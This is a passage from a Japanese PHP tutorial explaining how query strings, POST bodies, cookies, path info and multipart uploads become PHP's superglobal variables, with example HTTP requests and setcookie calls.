<span id="スーパーグローバル変数の生成" class="fragment"></span><a href="#%E3%82%B9%E3%83%BC%E3%83%91%E3%83%BC%E3%82%B0%E3%83%AD%E3%83%BC%E3%83%90%E3%83%AB%E5%A4%89%E6%95%B0%E3%81%AE%E7%94%9F%E6%88%90"><i class="fa fa-link"></i></a>スーパーグローバル変数の生成</h1>

<p>リクエストが来たとき，それに応じた <code>$_GET</code> <code>$_POST</code> <code>$_COOKIE</code> が生成される様子を見ていきましょう．</p>

<h2>
<span id="連想配列のパラメータを文字列で表現する" class="fragment"></span><a href="#%E9%80%A3%E6%83%B3%E9%85%8D%E5%88%97%E3%81%AE%E3%83%91%E3%83%A9%E3%83%A1%E3%83%BC%E3%82%BF%E3%82%92%E6%96%87%E5%AD%97%E5%88%97%E3%81%A7%E8%A1%A8%E7%8F%BE%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a>連想配列のパラメータを文字列で表現する</h2>

<p>まず，このような連想配列のデータがあったとき…</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="nv">$data</span> <span class="o">=</span> <span class="p">[</span>
    <span class="s1">'A'</span> <span class="o">=&gt;</span> <span class="s1">'B'</span><span class="p">,</span>
    <span class="s1">'C'</span> <span class="o">=&gt;</span> <span class="p">[</span>
        <span class="s1">'D'</span> <span class="o">=&gt;</span> <span class="s1">'E'</span><span class="p">,</span>
    <span class="p">],</span>
<span class="p">];</span>
</pre></div></div>

<p>それを文字列として表現するには，大雑把に言うと2種類の形式があることを覚えてください．それぞれ， <strong>クエリ―ストリング</strong> および <strong>Cookieヘッダー</strong> といいます．</p>

<div class="code-frame" data-lang="text">
<div class="code-lang"><span class="bold">クエリ―ストリングの場合</span></div>
<div class="highlight"><pre><span></span>A=B&amp;C[D]=E
</pre></div>
</div>

<div class="code-frame" data-lang="text">
<div class="code-lang"><span class="bold">Cookieヘッダーの場合</span></div>
<div class="highlight"><pre><span></span>Cookie: A=B; C[D]=E
</pre></div>
</div>

<p>なんとなくわかりますかね？</p>

<ul>
<li>キー<code>A</code>の値は<code>B</code>
</li>
<li>キー<code>C</code>に対応する値は配列で，さらにそのキー<code>D</code>に対応する値がE</li>
</ul>

<p>基本はこれだけで十分です．<ins>PHPはこれらの文字列を解析し，もとの配列に復元する仕事をしています</ins>．細かなパース規則については<a href="#%E3%83%AA%E3%82%AF%E3%82%A8%E3%82%B9%E3%83%88%E3%83%91%E3%83%A9%E3%83%A1%E3%83%BC%E3%82%BF%E3%81%AE%E3%83%91%E3%83%BC%E3%82%B9%E8%A6%8F%E5%89%87">付録</a>にしておきましたので，厳密にいろいろ試したい人は読んでください．</p>

<h2>
<span id="phpがwebブラウザからパラメータを受け取る方法-基本編" class="fragment"></span><a href="#php%E3%81%8Cweb%E3%83%96%E3%83%A9%E3%82%A6%E3%82%B6%E3%81%8B%E3%82%89%E3%83%91%E3%83%A9%E3%83%A1%E3%83%BC%E3%82%BF%E3%82%92%E5%8F%97%E3%81%91%E5%8F%96%E3%82%8B%E6%96%B9%E6%B3%95-%E5%9F%BA%E6%9C%AC%E7%B7%A8"><i class="fa fa-link"></i></a>PHPがWebブラウザからパラメータを受け取る方法 (基本編)</h2>

<p>以下の2点に留意してお読みください．</p>

<ul>
<li>ヘッダーの1行1行を区切るために使用される改行コードは <strong>CRLF</strong> <code>"\r\n"</code> である．</li>
<li>ヘッダーの生成と送信はWebブラウザが全自動でやってくれるので，普段私たちが普通にWebブラウザを使う限りは意識することはない．</li>
</ul>

<h3>
<span id="urlにクエリストリングを含める" class="fragment"></span><a href="#url%E3%81%AB%E3%82%AF%E3%82%A8%E3%83%AA%E3%82%B9%E3%83%88%E3%83%AA%E3%83%B3%E3%82%B0%E3%82%92%E5%90%AB%E3%82%81%E3%82%8B"><i class="fa fa-link"></i></a>URLにクエリ―ストリングを含める</h3>

<p>クエリ―ストリングはURLの <code>?</code> より後ろの部分に記述されます．</p>

<h4>
<span id="送信側" class="fragment"></span><a href="#%E9%80%81%E4%BF%A1%E5%81%B4"><i class="fa fa-link"></i></a><font color="silver">送信側</font>
</h4>

<div class="code-frame" data-lang="html">
<div class="code-lang"><span class="bold">リンクをクリックするとリクエストが実行される</span></div>
<div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">"http://example.com/test.php?a=b"</span><span class="p">&gt;</span>Test<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
</pre></div>
</div>

<div class="code-frame" data-lang="html">
<div class="code-lang"><span class="bold">フォームを送信するとリクエストが実行される</span></div>
<div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="nt">form</span> <span class="na">method</span><span class="o">=</span><span class="s">"get"</span> <span class="na">action</span><span class="o">=</span><span class="s">"http://example.com/test.php"</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">"hidden"</span> <span class="na">name</span><span class="o">=</span><span class="s">"a"</span> <span class="na">value</span><span class="o">=</span><span class="s">"b"</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">"submit"</span> <span class="na">value</span><span class="o">=</span><span class="s">"送信"</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
</pre></div>
</div>

<div class="code-frame" data-lang="http">
<div class="code-lang"><span class="bold">リクエストヘッダー</span></div>
<div class="highlight"><pre><span></span><span class="nf">GET</span> <span class="nn">/test.php?a=b</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="o">:</span> <span class="l">example.com</span>
<span class="na">Connection</span><span class="o">:</span> <span class="l">Close</span>

</pre></div>
</div>

<h4>
<span id="受信側" class="fragment"></span><a href="#%E5%8F%97%E4%BF%A1%E5%81%B4"><i class="fa fa-link"></i></a><font color="silver">受信側</font>
</h4>

<p>クエリ―ストリングは <strong><code>$_SERVER['QUERY_STRING']</code></strong> に格納されます．</p>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">文字列としてこのようにセットされる，もしくは未定義</span></div>
<div class="highlight"><pre><span></span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'QUERY_STRING'</span><span class="p">]</span> <span class="o">=</span> <span class="s1">'a=b'</span><span class="p">;</span>
</pre></div>
</div>

<p>私のテストした環境では <code>?</code> がURL中に存在しない場合でもこのインデックスは <strong>空文字列</strong> として常に存在するようですが，マニュアルでは未定義になる可能性が示唆されているため，使用する場合は以下のようにしてください．</p>

<ul>
<li>
<a href="http://www.php.net/manual/ja/function.isset.php" rel="nofollow noopener" target="_blank">isset</a> でチェックする</li>
<li>
<code>??</code>演算子でチェックする (PHP7.0以降)</li>
<li>
<a href="http://www.php.net/manual/ja/function.filter-input.php" rel="nofollow noopener" target="_blank">filter_input</a> 関数経由で取得する</li>
</ul>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">これらのうち，いずれかの記述を採用する</span></div>
<div class="highlight"><pre><span></span><span class="nv">$query_string</span> <span class="o">=</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'QUERY_STRING'</span><span class="p">])</span> <span class="o">?</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'QUERY_STRING'</span><span class="p">]</span> <span class="o">:</span> <span class="s1">''</span><span class="p">;</span>
<span class="nv">$query_string</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'QUERY_STRING'</span><span class="p">]</span> <span class="o">??</span> <span class="s1">''</span><span class="p">;</span>
<span class="nv">$query_string</span> <span class="o">=</span> <span class="p">(</span><span class="nx">string</span><span class="p">)</span><span class="nb">filter_input</span><span class="p">(</span><span class="nx">INPUT_SERVER</span><span class="p">,</span> <span class="s1">'QUERY_STRING'</span><span class="p">);</span>
</pre></div>
</div>

<p>これをパースして配列に格納したものが <code>$_GET</code> です．この変数は常に存在しています．</p>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">配列としてこのようにセットされる</span></div>
<div class="highlight"><pre><span></span><span class="nv">$_GET</span> <span class="o">=</span> <span class="p">[</span><span class="s1">'a'</span> <span class="o">=&gt;</span> <span class="s1">'b'</span><span class="p">];</span>
</pre></div>
</div>

<h3>
<span id="ポストフィールドにクエリストリングを含める" class="fragment"></span><a href="#%E3%83%9D%E3%82%B9%E3%83%88%E3%83%95%E3%82%A3%E3%83%BC%E3%83%AB%E3%83%89%E3%81%AB%E3%82%AF%E3%82%A8%E3%83%AA%E3%82%B9%E3%83%88%E3%83%AA%E3%83%B3%E3%82%B0%E3%82%92%E5%90%AB%E3%82%81%E3%82%8B"><i class="fa fa-link"></i></a>ポストフィールドにクエリ―ストリングを含める</h3>

<h4>
<span id="送信側-1" class="fragment"></span><a href="#%E9%80%81%E4%BF%A1%E5%81%B4-1"><i class="fa fa-link"></i></a><font color="silver">送信側</font>
</h4>

<p>クエリ―ストリングはヘッダー群の一番下に空行を1つ挟んで配置され，ここは <strong>ポストフィールド</strong> と呼ばれることがあります．以下のヘッダーを必ず伴います．</p>

<h5>
<span id="content-length" class="fragment"></span><a href="#content-length"><i class="fa fa-link"></i></a><code>Content-Length</code>
</h5>

<p>クエリ―ストリングの <strong>バイト数</strong> を表します．</p>

<h5>
<span id="content-type" class="fragment"></span><a href="#content-type"><i class="fa fa-link"></i></a><code>Content-Type</code>
</h5>

<p><a href="http://www.wdic.org/w/WDIC/application/x-www-form-urlencoded" rel="nofollow noopener" target="_blank">application/x-www-form-urlencoded</a> 固定です．</p>

<div class="code-frame" data-lang="html">
<div class="code-lang"><span class="bold">フォームを送信するとリクエストが実行される</span></div>
<div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="nt">form</span> <span class="na">method</span><span class="o">=</span><span class="s">"post"</span> <span class="na">action</span><span class="o">=</span><span class="s">"http://example.com/test.php"</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">"hidden"</span> <span class="na">name</span><span class="o">=</span><span class="s">"a"</span> <span class="na">value</span><span class="o">=</span><span class="s">"b"</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">"submit"</span> <span class="na">value</span><span class="o">=</span><span class="s">"送信"</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
</pre></div>
</div>

<div class="code-frame" data-lang="http">
<div class="code-lang"><span class="bold">リクエストヘッダー</span></div>
<div class="highlight"><pre><span></span><span class="nf">POST</span> <span class="nn">/test.php</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="o">:</span> <span class="l">example.com</span>
<span class="na">Content-Length</span><span class="o">:</span> <span class="l">3</span>
<span class="na">Content-Type</span><span class="o">:</span> <span class="l">application/x-www-form-urlencoded</span>
<span class="na">Connection</span><span class="o">:</span> <span class="l">Close</span>

a=b
</pre></div>
</div>

<h4>
<span id="受信側-1" class="fragment"></span><a href="#%E5%8F%97%E4%BF%A1%E5%81%B4-1"><i class="fa fa-link"></i></a><font color="silver">受信側</font>
</h4>

<p>クエリ―ストリング部分が文字列で欲しい場合， <strong><code>php://input</code></strong> をファイルのように取得させます．</p>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">文字列で取得できる</span></div>
<div class="highlight"><pre><span></span><span class="nv">$postfields</span> <span class="o">=</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="s1">'php://input'</span><span class="p">);</span>
</pre></div>
</div>

<p>これをパースして配列に格納したものが <code>$_POST</code> です．この変数は常に存在しています．</p>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">配列としてこのようにセットされる</span></div>
<div class="highlight"><pre><span></span><span class="nv">$_POST</span> <span class="o">=</span> <span class="p">[</span><span class="s1">'a'</span> <span class="o">=&gt;</span> <span class="s1">'b'</span><span class="p">];</span>
</pre></div>
</div>

<h3>
<span id="cookieヘッダーを送信する" class="fragment"></span><a href="#cookie%E3%83%98%E3%83%83%E3%83%80%E3%83%BC%E3%82%92%E9%80%81%E4%BF%A1%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a>Cookieヘッダーを送信する</h3>

<h4>
<span id="cookieを保存させる" class="fragment"></span><a href="#cookie%E3%82%92%E4%BF%9D%E5%AD%98%E3%81%95%E3%81%9B%E3%82%8B"><i class="fa fa-link"></i></a><font color="silver">Cookieを保存させる</font>
</h4>

<p><a href="http://www.php.net/manual/ja/function.setcookie.php" rel="nofollow noopener" target="_blank">setcookie</a> 関数または <a href="http://www.php.net/manual/ja/function.setrawcookie.php" rel="nofollow noopener" target="_blank">setrawcookie</a> 関数を使うと，ブラウザに対して簡単に整形された <strong>Set-Cookieヘッダー</strong> を送信することが出来ます．前者は<ins>値のみパーセントエンコード</ins>し，後者はキー・値ともそのままセットします．</p>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">PHPでこれを実行する</span></div>
<div class="highlight"><pre><span></span><span class="nb">setcookie</span><span class="p">(</span><span class="s1">'a'</span><span class="p">,</span> <span class="s1">'b'</span><span class="p">);</span>
</pre></div>
</div>

<div class="code-frame" data-lang="text">
<div class="code-lang"><span class="bold">Webブラウザに送信されるSet-Cookieヘッダー <br>(基本形であって，実際にはこれの後ろにいろいろな情報が付加される)</span></div>
<div class="highlight"><pre><span></span>Set-Cookie: a=b
</pre></div>
</div>

<p>これをブラウザが受理すると，<ins>次回から</ins>同一サイトに対してCookieヘッダーを送信してくれるようになります．この関数を実行したタイミングではCookieヘッダーは送信されてきていないことに注意してください．また，これらの関数で以下のパラメータを設定すると，Cookieの挙動を詳細に制御することが出来ます．</p>

<h5>
<span id="expire" class="fragment"></span><a href="#expire"><i class="fa fa-link"></i></a><code>$expire</code>
</h5>

<p>有効期限．タイムスタンプとして表される．</p>

<ul>
<li>省略または <code>0</code> を指定した場合，Webブラウザを閉じるまでが有効期限となる．</li>
<li>
<code>0</code> より大きく現在より小さい値（過去）を指定した場合，<ins>即座にWebブラウザで削除が行われる</ins>．但し， <strong>共通な <code>$path</code> <code>$domain</code></strong> を指定していなければならない．</li>
</ul>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">よく見かける例</span></div>
<div class="highlight"><pre><span></span><span class="nb">setcookie</span><span class="p">(</span><span class="s1">'foo'</span><span class="p">,</span> <span class="s1">''</span><span class="p">,</span> <span class="nb">time</span><span class="p">()</span> <span class="o">-</span> <span class="mi">3600</span><span class="p">);</span>
</pre></div>
</div>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">実はこれでもOK</span></div>
<div class="highlight"><pre><span></span><span class="nb">setcookie</span><span class="p">(</span><span class="s1">'foo'</span><span class="p">,</span> <span class="s1">''</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
</pre></div>
</div>

<h5>
<span id="path" class="fragment"></span><a href="#path"><i class="fa fa-link"></i></a><code>$path</code>
</h5>

<p>どこの階層から送信を行うかを表したパス．省略した場合は <strong>スクリプトが存在しているディレクトリ</strong> を指定したと見なされる．</p>

<h5>
<span id="domain" class="fragment"></span><a href="#domain"><i class="fa fa-link"></i></a><code>$domain</code>
</h5>

<p>対象となるドメイン名．省略した場合はスクリプトが存在するサーバーのものがそのまま使われる．</p>

<h5>
<span id="secure" class="fragment"></span><a href="#secure"><i class="fa fa-link"></i></a><code>$secure</code>
</h5>

<p>HTTPS接続のみに限定するかどうか．デフォルト値は <code>false</code> ．</p>

<h5>
<span id="httponly" class="fragment"></span><a href="#httponly"><i class="fa fa-link"></i></a><code>$httponly</code>
</h5>

<p>JavaScriptからのアクセスをブロックするかどうか．デフォルト値は <code>false</code> ．</p>

<p>これらを指定したとき，送出されるヘッダーは以下のようになります．</p>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">(実行例) PHPコード</span></div>
<div class="highlight"><pre><span></span><span class="nb">setcookie</span><span class="p">(</span><span class="s1">'a'</span><span class="p">,</span> <span class="s1">'b'</span><span class="p">,</span> <span class="mi">992174400</span><span class="p">,</span> <span class="s1">'/foo/bar'</span><span class="p">,</span> <span class="s1">'example.com'</span><span class="p">,</span> <span class="k">false</span><span class="p">,</span> <span class="k">true</span><span class="p">);</span>
</pre></div>
</div>

<div class="code-frame" data-lang="text">
<div class="code-lang"><span class="bold">(実行結果) Set-Cookieヘッダー</span></div>
<div class="highlight"><pre><span></span>Set-Cookie: a=b; expires=Sun, 10-Jun-2001 12:00:00 GMT; path=/foo/bar; domain=example.com; httponly
</pre></div>
</div>

<h4>
<span id="cookieを受信する" class="fragment"></span><a href="#cookie%E3%82%92%E5%8F%97%E4%BF%A1%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a><font color="silver">Cookieを受信する</font>
</h4>

<p>文字列のままのCookieは<ins>頭の</ins><strong><code>Cookie:</code></strong><ins>を除いて</ins> <strong><code>$_SERVER['HTTP_COOKIE']</code></strong> に格納されます．</p>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">文字列としてこのようにセットされる，もしくは未定義</span></div>
<div class="highlight"><pre><span></span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'HTTP_COOKIE'</span><span class="p">]</span> <span class="o">=</span> <span class="s1">'a=b'</span><span class="p">;</span>
</pre></div>
</div>

<p>Cookieヘッダーが無い場合，このインデックスは存在しません．使用する場合は <code>$_SERVER['QUERY_STRING']</code> と同様のチェックが必要です．</p>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">これらのうち，いずれかの記述を採用する</span></div>
<div class="highlight"><pre><span></span><span class="nv">$cookie</span> <span class="o">=</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'HTTP_COOKIE'</span><span class="p">])</span> <span class="o">?</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'HTTP_COOKIE'</span><span class="p">]</span> <span class="o">:</span> <span class="s1">''</span><span class="p">;</span>
<span class="nv">$cookie</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'HTTP_COOKIE'</span><span class="p">]</span> <span class="o">??</span> <span class="s1">''</span><span class="p">;</span>
<span class="nv">$cookie</span> <span class="o">=</span> <span class="p">(</span><span class="nx">string</span><span class="p">)</span><span class="nb">filter_input</span><span class="p">(</span><span class="nx">INPUT_SERVER</span><span class="p">,</span> <span class="s1">'HTTP_COOKIE'</span><span class="p">);</span>
</pre></div>
</div>

<p>これをパースして配列に格納したものが <code>$_COOKIE</code> です．この変数は常に存在しています．</p>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">配列としてこのようにセットされる</span></div>
<div class="highlight"><pre><span></span><span class="nv">$_COOKIE</span> <span class="o">=</span> <span class="p">[</span><span class="s1">'a'</span> <span class="o">=&gt;</span> <span class="s1">'b'</span><span class="p">];</span>
</pre></div>
</div>

<h2>
<span id="phpがwebブラウザからパラメータを受け取る方法-応用編" class="fragment"></span><a href="#php%E3%81%8Cweb%E3%83%96%E3%83%A9%E3%82%A6%E3%82%B6%E3%81%8B%E3%82%89%E3%83%91%E3%83%A9%E3%83%A1%E3%83%BC%E3%82%BF%E3%82%92%E5%8F%97%E3%81%91%E5%8F%96%E3%82%8B%E6%96%B9%E6%B3%95-%E5%BF%9C%E7%94%A8%E7%B7%A8"><i class="fa fa-link"></i></a>PHPがWebブラウザからパラメータを受け取る方法 (応用編)</h2>

<h3>
<span id="urlにパス情報を含める" class="fragment"></span><a href="#url%E3%81%AB%E3%83%91%E3%82%B9%E6%83%85%E5%A0%B1%E3%82%92%E5%90%AB%E3%82%81%E3%82%8B"><i class="fa fa-link"></i></a>URLにパス情報を含める</h3>

<p>ファイルをディレクトリのように見せ，その後ろに追加で情報を階層的に記述することが可能です．</p>

<h4>
<span id="送信側-2" class="fragment"></span><a href="#%E9%80%81%E4%BF%A1%E5%81%B4-2"><i class="fa fa-link"></i></a><font color="silver">送信側</font>
</h4>

<div class="code-frame" data-lang="html">
<div class="code-lang"><span class="bold">リンクをクリックするとリクエストが実行される</span></div>
<div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">"http://example.com/test.php/foo/bar"</span><span class="p">&gt;</span>Test<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
</pre></div>
</div>

<div class="code-frame" data-lang="http">
<div class="code-lang"><span class="bold">リクエストヘッダー</span></div>
<div class="highlight"><pre><span></span><span class="nf">GET</span> <span class="nn">/test.php/foo/bar</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="o">:</span> <span class="l">example.com</span>
<span class="na">Connection</span><span class="o">:</span> <span class="l">Close</span>

</pre></div>
</div>

<h4>
<span id="受信側-2" class="fragment"></span><a href="#%E5%8F%97%E4%BF%A1%E5%81%B4-2"><i class="fa fa-link"></i></a><font color="silver">受信側</font>
</h4>

<p>パス情報は <strong><code>$_SERVER['PATH_INFO']</code></strong> に格納されます．</p>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">文字列としてこのようにセットされる，もしくは未定義</span></div>
<div class="highlight"><pre><span></span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'PATH_INFO'</span><span class="p">]</span> <span class="o">=</span> <span class="s1">'/foo/bar'</span><span class="p">;</span>
</pre></div>
</div>

<p>この部分が無い場合，このインデックスは存在しません．使用する場合は <code>$_SERVER['QUERY_STRING']</code> と同様のチェックが必要です (省略) ．</p>

<p><strong>【注意】</strong><br>
<code>+</code> は半角スペースに置換され<strong>ません</strong>． <a href="http://www.php.net/manual/ja/function.setcookie.php" rel="nofollow noopener" target="_blank">rawurldecode</a> 関数相当の処理です．</p>

<h3>
<span id="ポストフィールドにマルチパートコンテンツを含める" class="fragment"></span><a href="#%E3%83%9D%E3%82%B9%E3%83%88%E3%83%95%E3%82%A3%E3%83%BC%E3%83%AB%E3%83%89%E3%81%AB%E3%83%9E%E3%83%AB%E3%83%81%E3%83%91%E3%83%BC%E3%83%88%E3%82%B3%E3%83%B3%E3%83%86%E3%83%B3%E3%83%84%E3%82%92%E5%90%AB%E3%82%81%E3%82%8B"><i class="fa fa-link"></i></a>ポストフィールドにマルチパートコンテンツを含める</h3>

<p>パラメータが<ins>パーセントエンコードされない</ins>のが特徴です．そのため，通信量が肥大化しやすいファイルのアップロードに利用されます．</p>

<h4>
<span id="送信側-3" class="fragment"></span><a href="#%E9%80%81%E4%BF%A1%E5%81%B4-3"><i class="fa fa-link"></i></a><font color="silver">送信側</font>
</h4>

<p>マルチパートコンテンツはヘッダー群の一番下に空行を1つ挟んで配置され，以下のヘッダーを必ず伴います．</p>

<h5>
<span id="content-length-1" class="fragment"></span><a href="#content-length-1"><i class="fa fa-link"></i></a><code>Content-Length</code>
</h5>

<p>マルチパートコンテンツの <strong>総バイト数</strong> を表します．</p>

<h5>
<span id="content-type-1" class="fragment"></span><a href="#content-type-1"><i class="fa fa-link"></i></a><code>Content-Type</code>
</h5>

<p><code>multipart/form-data; boundary=境界文字列</code> という形式です．改行などを除く任意の文字列を設定できますが，送信するデータと衝突する可能性の無いランダムなハッシュ値を採用することが多いと思います．ブラウザによって実装は異なるようです．</p>

<p>各コンテンツは以下のような形式です．</p>

<div class="code-frame" data-lang="text">
<div class="code-lang"><span class="bold">通常のパラメータ</span></div>
<div class="highlight"><pre><span></span>--境界文字列
Content-Disposition: form-data; name="NAME属性値"

送信するVALUE属性値
</pre></div>
</div>

<div class="code-frame" data-lang="ファイルであることを明示するパラメータ"><div class="highlight"><pre><span></span>--境界文字列
Content-Disposition: form-data; name="NAME属性値"; filename="ファイル名"
Content-Type: MIMEタイプ（ブラウザが自動判定）

送信するファイルデータ
</pre></div></div>

<p>これらが連続で配置され，最後のパラメータの後には次の1行が挿入されます．</p>

<div class="code-frame" data-lang="text">
<div class="code-lang"><span class="bold">終端行</span></div>
<div class="highlight"><pre><span></span>--境界文字列--
</pre></div>
</div>

<p>以下にリクエストの例を示します．</p>

<div class="code-frame" data-lang="html">
<div class="code-lang"><span class="bold">フォームを送信するとリクエストが実行される</span></div>
<div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="nt">form</span> <span class="na">method</span><span class="o">=</span><span class="s">"post"</span> <span class="na">action</span><span class="o">=</span><span class="s">"http://example.com/test.php"</span> <span class="na">enctype</span><span class="o">=</span><span class="s">"multipart/form-data"</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">"hidden"</span> <span class="na">name</span><span class="o">=</span><span class="s">"hidden"</span> <span class="na">value</span><span class="o">=</span><span class="s">"あいうえお"</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">"file"</span> <span class="na">name</span><span class="o">=</span><span class="s">"file"</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">"submit"</span> <span class="na">value</span><span class="o">=</span><span class="s">"送信"</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
</pre></div>
</div>

<div class="code-frame" data-lang="http">
<div class="code-lang"><span class="bold">リクエストヘッダー</span></div>
<div class="highlight"><pre><span></span><span class="nf">POST</span> <span class="nn">/test.php</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="o">:</span> <span class="l">example.com</span>
<span class="na">Content-Length</span><span class="o">:</span> <span class="l">257</span>
<span class="na">Content-Type</span><span class="o">:</span> <span class="l">multipart/form-data; boundary=-----hogehoge</span>
<span class="na">Connection</span><span class="o">:</span> <span class="l">Close</span>

-------hogehoge
Content-Disposition: form-data; name="hidden"

あいうえお
-------hogehoge
Content-Disposition: form-data; name="file"; filename="sample.txt"
Content-Type: text/plain

サンプルファイルデータ
-------hogehoge--
</pre></div>
</div>

<h4>
<span id="受信側-3" class="fragment"></span><a href="#%E5%8F%97%E4%BF%A1%E5%81%B4-3"><i class="fa fa-link"></i></a><font color="silver">受信側</font>
</h4>

<p>ファイルに関するものは <strong><code>$_FILES</code></strong> ，それ以外のものは <code>$_POST</code> に格納されます．これ以上の説明はここでは割愛しますので，参考リンクだけ記載しておきます．</p>

<ul>
<li><a href="http://qiita.com/mpyw/items/939964377766a54d4682" id="reference-193afc9d6d942abcd156">Qiita - ファイルアップロードの例外処理はこれぐらいしないと気が済まない</a></li>
</ul>

<h3>
<span id="_get-_post-に同時に格納させる" class="fragment"></span><a href="#_get-_post-%E3%81%AB%E5%90%8C%E6%99%82%E3%81%AB%E6%A0%BC%E7%B4%8D%E3%81%95%E3%81%9B%E3%82%8B"><i class="fa fa-link"></i></a><code>$_GET</code> <code>$_POST</code> に同時に格納させる</h3>

<p>method属性がpostのとき，action属性の値に <code>?</code> に続いてクエリを付加することで実現できます．ただし，あまり出番はありません．というよりもややこしいので，使わないほうがいいです．</p>

<div class="code-frame" data-lang="html">
<div class="code-lang"><span class="bold">フォームを送信するとリクエストが実行される</span></div>
<div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="nt">form</span> <span class="na">method</span><span class="o">=</span><span class="s">"post"</span> <span class="na">action</span><span class="o">=</span><span class="s">"http://example.com/test.php?a=b"</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">"hidden"</span> <span class="na">name</span><span class="o">=</span><span class="s">"c"</span> <span class="na">value</span><span class="o">=</span><span class="s">"d"</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">"submit"</span> <span class="na">value</span><span class="o">=</span><span class="s">"送信"</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
</pre></div>
</div>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">配列としてこのようにセットされる</span></div>
<div class="highlight"><pre><span></span><span class="nv">$_GET</span> <span class="o">=</span> <span class="p">[</span><span class="s1">'a'</span> <span class="o">=&gt;</span> <span class="s1">'b'</span><span class="p">];</span>
<span class="nv">$_POST</span> <span class="o">=</span> <span class="p">[</span><span class="s1">'c'</span> <span class="o">=&gt;</span> <span class="s1">'d'</span><span class="p">];</span>
</pre></div>
</div>

<h3>
<span id="_get-_post-_cookie-をまとめて扱う" class="fragment"></span><a href="#_get-_post-_cookie-%E3%82%92%E3%81%BE%E3%81%A8%E3%82%81%E3%81%A6%E6%89%B1%E3%81%86"><i class="fa fa-link"></i></a><code>$_GET</code> <code>$_POST</code> <code>$_COOKIE</code> をまとめて扱う</h3>

<p><code>$_GET</code> → <code>$_POST</code> → <code>$_COOKIE</code> の順に上書き代入を行い，生成されるスーパーグローバル変数が <strong><code>$_REQUEST</code></strong> です．この変数は常に存在しています．これもややこしさを助長するだけですので，使わないほうがいいです．</p>

<h1>
<span id="phpから他のスクリプトにリクエストを送信する方法" class="fragment"></span><a href="#php%E3%81%8B%E3%82%89%E4%BB%96%E3%81%AE%E3%82%B9%E3%82%AF%E3%83%AA%E3%83%97%E3%83%88%E3%81%AB%E3%83%AA%E3%82%AF%E3%82%A8%E3%82%B9%E3%83%88%E3%82%92%E9%80%81%E4%BF%A1%E3%81%99%E3%82%8B%E6%96%B9%E6%B3%95"><i class="fa fa-link"></i></a>PHPから他のスクリプトにリクエストを送信する方法</h1>

